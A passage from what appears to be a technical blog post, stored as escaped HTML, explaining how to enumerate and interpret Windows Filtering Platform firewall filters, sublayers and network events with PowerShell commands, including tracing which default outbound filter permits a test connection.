&amp;nbsp; &amp;nbsp; 4 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;You can also inspect the sublayers in the same way, using the &lt;/span&gt;&lt;span class="c7"&gt;Get-FwSubLayer&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command as shown above. The most useful information from the sublayer is the weight. As mentioned earlier this is used to determine the ordering of the associated filters. However, as we&amp;#39;ll see you rarely need to query the weight yourself.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c33" id="h.kx4txr7dcefa"&gt;&lt;span class="c16"&gt;Filter Configuration&lt;/span&gt;&lt;/h3&gt; &lt;p class="c4"&gt;&lt;span&gt;Enforcing the firewall rules is up to the filters. You can enumerate all filters using the &lt;/span&gt;&lt;span class="c7"&gt;Get-FwFilter&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9a80e20803cd73322ecbf4a3ef4396e7654974d5"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FilterId ActionType Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;-------- ---------- ----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;68071 &amp;nbsp; &amp;nbsp;Block &amp;nbsp; &amp;nbsp; Boot Time Filter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;71199 &amp;nbsp; &amp;nbsp;Permit &amp;nbsp; &amp;nbsp;@FirewallAPI.dll,-80201&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;71350 &amp;nbsp; &amp;nbsp;Block &amp;nbsp; &amp;nbsp; Block inbound traffic to dmcertinst.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The default output shows the ID of a filter, the action type and the user defined name. The filter objects returned also contain the layer and sublayer identifiers as well as the list of matching conditions for the filter. As inspecting the filter is going to be the most common operation the module provides the &lt;/span&gt;&lt;span class="c7"&gt;Format-FwFilter&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command to format a filter object in a more readable format.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.46076ba715cf35b252b036a49f94a51358ed2a50"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -Id 71350 | Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : Block inbound traffic to dmcertinst.exe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Block&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: c391b53a-1b98-491c-9973-d86e23ea8a84&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 71350&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: Indexed&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 549755813888&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;--------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_APP_ID Equal &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;\device\harddiskvolume3\windows\system32\dmcertinst.exe&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The formatted output contains the layer and sublayer information, the assigned weight of the filter and the list of conditions. The layer is &lt;/span&gt;&lt;span class="c7"&gt;FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4&lt;/span&gt;&lt;span&gt;&amp;nbsp;which handles new incoming connections. The sublayer is MICROSOFT_DEFENDER_SUBLAYER_WSH which is used to group &lt;/span&gt;&lt;span class="c7"&gt;Windows Service Hardening&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;rules which apply regardless of the normal firewall configuration.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;In this example the filter only matches on the socket creator process executable&amp;#39;s path. The end result if the filter matches the current state is for the IPv4 TCP network connection to be blocked at the &lt;/span&gt;&lt;span class="c7"&gt;MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;sublayer. As already mentioned it now won&amp;#39;t matter if a lower priority layer would permit the connection if the block is enforced.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;How can we determine the ordering of sublayers and filters? You could manually extract the weights for each sublayer and filter and try and order them, and hopefully the ordering you come up with matches what WFP uses. A much simpler approach is to specify a flag when enumerating filters for a particular layer to request the BFE APIs sort the filters using the canonical ordering. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.bbb84a15b64f223a1178403511b7ef1ab83275c5"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -AleLayer ConnectV4 -Sorted&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FilterId ActionType &amp;nbsp; &amp;nbsp; Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;-------- ---------- &amp;nbsp; &amp;nbsp; ----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;65888 &amp;nbsp; &amp;nbsp;Permit &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Interface Un-quarantine filter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;66469 &amp;nbsp; &amp;nbsp;Block &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;66467 &amp;nbsp; &amp;nbsp;Permit &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;66473 &amp;nbsp; &amp;nbsp;Block &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c7"&gt;Sorted&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;parameter specifies the flag to sort the filters. You can now go through the list of filters in order and try and work out what would be the matched filter based on some criteria you decide on. Again it&amp;#39;d be helpful if we could get the BFE service to do more of the hard work in figuring out what rules would apply given a particular process. For this we can specify some of the metadata that represents the connection being made and get the BFE service to only return filters which match on their conditions.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e62ff3a5bf06c1a80c9f1aceaa36b7c60cdfdf25"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$template = New-FwFilterTemplate -AleLayer ConnectV4 -Sorted&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$fs = Get-FwFilter -Template $template&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$fs.Count&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;65&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -ProcessId $pid&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$addr = Resolve-DnsName &amp;quot;www.google.com&amp;quot; -Type A&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -IPAddress $addr.Address -Port 80&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -ProtocolType Tcp&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -ConditionFlags 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$template.Conditions&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- ----- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_APP_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; \device\harddisk...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; Equal &amp;nbsp; &amp;nbsp; FirewallTokenInformation &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; S-1-0-0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS Equal &amp;nbsp; &amp;nbsp; 142.250.72.196&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_PORT &amp;nbsp; &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; 80&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_PROTOCOL &amp;nbsp; &amp;nbsp; &amp;nbsp; Equal &amp;nbsp; &amp;nbsp; Tcp&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_FLAGS &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Equal &amp;nbsp; &amp;nbsp; None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$fs = Get-FwFilter -Template $template&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$fs.Count&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;To specify the metadata we need to create an enumeration template using the &lt;/span&gt;&lt;span class="c7"&gt;New-FwFilterTemplate&lt;/span&gt;&lt;span&gt;&amp;nbsp;command. We specify the Connect IPv4 layer as well as requesting that the results are sorted. Using this template with the &lt;/span&gt;&lt;span class="c7"&gt;Get-FwFilter&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command returns 65 results (on my machine). &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Next we add some metadata, first from the current powershell process. This populates the App ID with the executable path as well as token information such as the user ID and package ID of an AppContainer. We then add details about the target connection request, specifying a TCP connection to &lt;/span&gt;&lt;span class="c7"&gt;www.google.com&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;on port 80. Finally we add some condition flags, we&amp;#39;ll come back to these flags later.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;Using this new template results in only 2 filters whose conditions will match the metadata. Of course depending on your current configuration the number might be different. In this case 2 filters is much easier to understand than 65. If we format those two filter we see the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.14d3d8c28447d038e3573ae296e536607295fcde"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$fs | Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : Default Outbound&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 07ba2a96-0364-4759-966d-155007bde926&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 67989&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: Default Outbound&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_FIREWALL&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 9223372036854783936&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ORIGINAL_PROFILE_ID Equal &amp;nbsp; &amp;nbsp; Public &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_CURRENT_PROFILE_ID &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : Default Outbound&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 36da9a47-b57d-434e-9345-0e36809e3f6a&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 67993&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: Default Outbound&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_FIREWALL&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 3458764513820540928&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Both of the two filters permit the connection and based on the name they&amp;#39;re the default backstop when no other filters match. It&amp;#39;s possible to configure each network profile with different default backstops. In this case the default is to permit outbound traffic. We have two of them because both match all the metadata we provided, although if we&amp;#39;d specified a profile other than &lt;/span&gt;&lt;span class="c7"&gt;Public &lt;/span&gt;&lt;span class="c2"&gt;then we&amp;#39;d only get a single filter.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Can we prove that this is the filter which matches a TCP connection? Fortunately we can: WFP supports gathering network events related to the firewall. An event includes the filter which permitted or denied the network request, and we can then compare it to our two filters to see if one of them matched. You can use the &lt;/span&gt;&lt;span class="c7"&gt;Get-FwNetEvent&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command to read the current circular buffer of events.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fd84f43785a2f731e158c79bb81d95af29cb6154"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c23"&gt;Set-FwEngineOption -NetEventMatchAnyKeywords ClassifyAllow&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$s = [System.Net.Sockets.TcpClient]::new($addr.IPAddress, 80)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Set-FwEngineOption -NetEventMatchAnyKeywords None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$ev_temp = New-FwNetEventTemplate -Condition $template.Conditions&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $ev_temp -NetEventType ClassifyAllow&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwNetEvent -Template $ev_temp | Format-List&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;FilterId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: &lt;/span&gt;&lt;span class="c0 c36"&gt;67989&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;LayerId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 48&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;ReauthReason &amp;nbsp; &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;OriginalProfile : Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;CurrentProfile &amp;nbsp;: Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;MsFwpDirection &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;IsLoopback &amp;nbsp; &amp;nbsp; &amp;nbsp;: False&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Type &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: ClassifyAllow&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : IpProtocolSet, LocalAddrSet, RemoteAddrSet, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Timestamp &amp;nbsp; &amp;nbsp; &amp;nbsp; : 8/5/2021 11:24:41 AM&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;IPProtocol &amp;nbsp; &amp;nbsp; &amp;nbsp;: Tcp&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;LocalEndpoint &amp;nbsp; : 10.0.0.101:63046&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;RemoteEndpoint &amp;nbsp;: 142.250.72.196:80&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;ScopeId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;AppId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 